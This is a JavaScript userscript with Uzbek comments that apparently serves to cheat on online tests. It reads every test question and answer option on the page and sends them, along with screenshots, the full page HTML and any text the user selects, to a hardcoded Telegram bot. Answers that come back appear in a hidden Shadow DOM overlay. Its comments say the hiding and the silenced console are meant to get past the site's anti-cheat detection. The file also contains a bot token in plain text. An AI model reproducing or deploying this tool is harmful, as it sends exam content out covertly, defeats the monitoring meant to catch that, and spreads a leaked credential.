// == Telegram Config ==
(function() {
    'use strict';

    // ⚠️ DIQQAT: O'z tokeningizni va chat ID'ni shu yerga kiriting
    const telegramToken = '7189192224:AAEnNyUYC484cO9laStwCh3SU1LVyx9eHVg'; 
    const chatId = '-4878367805'; 
    let lastProcessedUpdateId = 0;

    // == Yashirin sozlamalar ==
    let holdTimer = null;
    let elementUnderCursor = null;
    const HOLD_DURATION = 1200; 

    // Sayt anti-cheat tizimlari ko'rmasligi uchun konsolni yashiramiz
    const secretLog = function() {}; // Rivojlantirish vaqtida buni console.log qilib o'zgartirishingiz mumkin
    const secretError = function() {}; 

    // == Sahifadagi klaviatura hodisalarini bloklash ==
    try {
        if (typeof jQuery !== 'undefined') {
            jQuery(document).off('keydown keypress keyup');
            jQuery(window).off('keydown keypress keyup');
        }
    } catch (e) {}

    // == Yo'qolgan funksiyani qo'shish: Rasmlarni ajratib olish ==
    function extractImageLinks(element) {
        if (!element) return '';
        const images = Array.from(element.querySelectorAll('img'));
        return images.map(img => img.src).join('\n');
    }

    // == Boshlang'ich skriptlarni yuklash ==
    function loadHtml2Canvas() {
        return new Promise((resolve, reject) => {
            if (window.html2canvas) return resolve();
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    // == Maxfiy Mini-oyna (Shadow DOM orqali) ==
    let miniWindowHost, shadowRoot;
    function createMiniWindow() {
        // Sayt skriptlari topolmasligi uchun tasodifiy nomli tegdagi Shadow DOM ishlatamiz
        miniWindowHost = document.createElement('div');
        miniWindowHost.style.all = 'initial'; // Sayt stillari ta'sir qilmasligi uchun
        document.body.appendChild(miniWindowHost);
        
        shadowRoot = miniWindowHost.attachShadow({ mode: 'closed' }); // 'closed' uni JS orqali topishni imkonsiz qiladi

        const miniWindowHTML = `
        <style>
            #mw-container {
                display: none;
                position: fixed;
                bottom: 10px;
                right: 10px;
                width: 200px;
                height: 200px;
                background: rgba(0, 0, 0, 0.8);
                border: 1px solid #333;
                border-radius: 5px;
                overflow-y: auto;
                z-index: 2147483647;
                font-family: sans-serif;
                color: #0f0;
                padding: 10px;
                font-size: 13px;
                box-sizing: border-box;
            }
            #mw-container::-webkit-scrollbar { width: 4px; }
            #mw-container::-webkit-scrollbar-thumb { background: #555; }
        </style>
        <div id="mw-container">
            <div id="mw-content">--</div>
        </div>`;
        
        shadowRoot.innerHTML = miniWindowHTML;
    }

    function appendMessageToMiniWindow(message) {
        if (!shadowRoot) return;
        const content = shadowRoot.querySelector('#mw-content');
        if (!content) return;
        if (content.textContent.trim() === "--") content.innerHTML = '';
        
        const msgEl = document.createElement('div');
        msgEl.style.marginBottom = '5px';
        msgEl.textContent = message;
        content.appendChild(msgEl);
        content.parentElement.scrollTop = content.parentElement.scrollHeight;
    }

    function toggleMiniWindow() {
        if (!shadowRoot) return;
        const win = shadowRoot.querySelector('#mw-container');
        if (win) win.style.display = win.style.display === 'none' ? 'block' : 'none';
    }

    // == Telegram bilan ishlash ==
    async function sendMessageToTelegram(text) {
        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' }),
            });
        } catch (error) {}
    }

    async function screenshotAndSend() {
        try {
            await loadHtml2Canvas();
            const canvas = await html2canvas(document.body, { scale: 1.5, useCORS: true });
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('document', blob, 'screenshot.png');
                
                await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/png');
        } catch (error) {}
    }

    async function sendPageAsHtmlFile() {
        try {
            const htmlContent = document.documentElement.outerHTML;
            const htmlBlob = new Blob([htmlContent], { type: 'text/html' });
            const fileName = (document.title || 'page').replace(/[^a-z0-9]/gi, '_').toLowerCase() + '.html';

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', htmlBlob, fileName);
            
            await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {}
    }

    async function getNewAnswersFromTelegram() {
        const url = `https://api.telegram.org/bot${telegramToken}/getUpdates?offset=${lastProcessedUpdateId + 1}&timeout=30`;
        try {
            const response = await fetch(url);
            if (!response.ok) return;
            const data = await response.json();
            if (data.ok && data.result) {
                data.result.forEach(update => {
                    if (update.message && update.message.text && update.update_id > lastProcessedUpdateId) {
                        lastProcessedUpdateId = update.update_id;
                        appendMessageToMiniWindow(update.message.text);
                    } else if (update.update_id > lastProcessedUpdateId) {
                        lastProcessedUpdateId = update.update_id;
                    }
                });
            }
        } catch (error) {}
    }

    // == Elementni topish ==
    function findMeaningfulBlock(element) {
        if (!element) return null;
        let candidate = element.closest('p, div, li, h1, h2, h3, span, td, .test-question, .answers-test');
        if (candidate && candidate.textContent.trim().length > 10) return candidate;
        return element.textContent.trim().length > 5 ? element : null;
    }

    // == Hodisalarni yashirincha ushlash (Capture mode) ==
    window.addEventListener('keyup', e => {
        const key = e.key.toLowerCase();
        if (key === 'x') screenshotAndSend();
        if (key === 'm') toggleMiniWindow();
        if (key === 'h') sendPageAsHtmlFile();
    }, true); // true - capture fazasida ushlash uchun

    window.addEventListener('mousedown', (e) => {
        if (e.button === 2) {
            elementUnderCursor = e.target;
            holdTimer = setTimeout(async () => {
                if (elementUnderCursor) {
                    const block = findMeaningfulBlock(elementUnderCursor);
                    if (block) {
                        const text = block.textContent?.trim();
                        const images = extractImageLinks(block);
                        if (text || images) {
                            let msg = `<b>Tanlangan:</b>\n<pre>${text.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
                            if (images) msg += `\n\n<b>Rasmlar:</b>\n${images}`;
                            await sendMessageToTelegram(msg);
                        }
                    }
                }
                holdTimer = null;
            }, HOLD_DURATION);
        }
    }, true);

    window.addEventListener('mouseup', (e) => {
        if (e.button === 2 && holdTimer) {
            clearTimeout(holdTimer);
            holdTimer = null;
        }
    }, true);

    window.addEventListener('contextmenu', (e) => {
        if (!holdTimer) {
            // Kontekst menyuni bloklash sezilarli bo'lishi mumkin, ehtiyot bo'ling
            toggleMiniWindow();
        }
    }, true);

    // == Parser ==
    async function processAndSendQuestions() {
        const tests = document.querySelectorAll('.table-test');
        if (tests.length === 0) return;

        const sortedTests = Array.from(tests).sort((a, b) => {
            return (parseInt(a.id.replace(/\D/g, ''), 10) || 0) - (parseInt(b.id.replace(/\D/g, ''), 10) || 0);
        });

        for (let i = 0; i < sortedTests.length; i++) {
            const test = sortedTests[i];
            const questionElement = test.querySelector('.test-question');
            const questionText = questionElement?.querySelector('p')?.textContent.trim() || '';
            const questionImages = extractImageLinks(questionElement);

            let messageContent = `<b>Savol ${i + 1}/${sortedTests.length}:</b>\n${questionText}\n\n`;
            if (questionImages) messageContent += `<i>Rasmlar:</i>\n${questionImages}\n\n`;
            
            const answers = Array.from(test.querySelectorAll('.answers-test li')).map(li => {
                const variant = li.querySelector('.test-variant')?.textContent.trim() || '';
                const answerText = li.querySelector('label p')?.textContent.trim() || '';
                const answerImage = extractImageLinks(li);
                return `${variant}. ${answerText} ${answerImage ? `(Rasm: ${answerImage})` : ''}`;
            });

            if (answers.length > 0) messageContent += '<b>Javoblar:</b>\n' + answers.join('\n');

            await sendMessageToTelegram(messageContent);
            await new Promise(r => setTimeout(r, 600)); // Anti-spam delay
        }
    }

    // == Ishga tushirish ==
    function main() {
        createMiniWindow();
        setInterval(getNewAnswersFromTelegram, 3000);
        setTimeout(processAndSendQuestions, 1500);
    }

    // Dastlabki yuklanish
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        main();
    } else {
        document.addEventListener('DOMContentLoaded', main);
    }

})();
